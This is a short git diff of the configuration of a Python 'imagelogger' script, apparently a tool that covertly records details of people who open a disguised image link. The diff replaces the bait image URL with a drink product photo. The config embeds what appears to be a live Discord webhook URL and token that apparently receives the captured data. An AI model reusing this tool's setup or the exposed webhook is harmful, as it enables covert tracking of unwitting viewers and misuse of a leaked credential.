@@ -13,7 +13,7 @@ __author__ = "Jelle_0546"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1429488751276720311/UEZmePDb-ph2WFcE7bBHvIyh4UH-IceyPMyGpENE7Vaf3I3onaeV5FDdz0ZK2zbnqVV8",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.fristi.nl%2Fproducten%2Ffristi-rood-fruit-smaak-1l&psig=AOvVaw2tls4OP14zuJeIXYgQN5Qj&ust=1760972239503000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCNCj8v_CsJADFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "image": "https://www.zelst.nl/media/catalog/product/cache/0bc127bc847f58ae277a81ddecf2174b/f/r/fristi_fles_1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
